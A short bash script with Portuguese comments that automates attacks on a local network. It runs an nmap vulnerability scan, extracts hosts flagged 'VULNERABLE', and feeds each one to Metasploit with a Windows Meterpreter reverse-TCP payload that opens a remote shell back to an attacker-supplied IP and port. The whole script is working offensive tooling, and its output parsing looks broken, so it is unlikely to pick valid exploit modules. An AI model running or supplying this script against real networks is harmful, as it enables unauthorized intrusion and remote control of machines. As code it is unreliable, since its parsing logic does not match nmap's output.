#!/bin/bash

# Define o endereço IP da rede a ser testada
NETWORK="192.168.1.0/24"

# Varre a rede em busca de sistemas online e portas abertas, identificando possíveis vulnerabilidades
nmap -T4 -sS -sV -O --script vuln $NETWORK -oN results.txt

# Analisa o arquivo de resultados do Nmap e identifica as vulnerabilidades encontradas
grep "VULNERABLE" results.txt | awk '{print $2,$6}' > vuln_list.txt

# Executa o Metasploit para explorar as vulnerabilidades encontradas em cada dispositivo
while read line; do
  ip=$(echo $line | awk '{print $1}')
  vuln=$(echo $line | awk '{print $2}')
  echo "Exploring vulnerability $vuln on device $ip"
  msfconsole -q -x "use $vuln; set RHOSTS $ip; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <your-ip>; set LPORT <your-port>; run"
done < vuln_list.txt
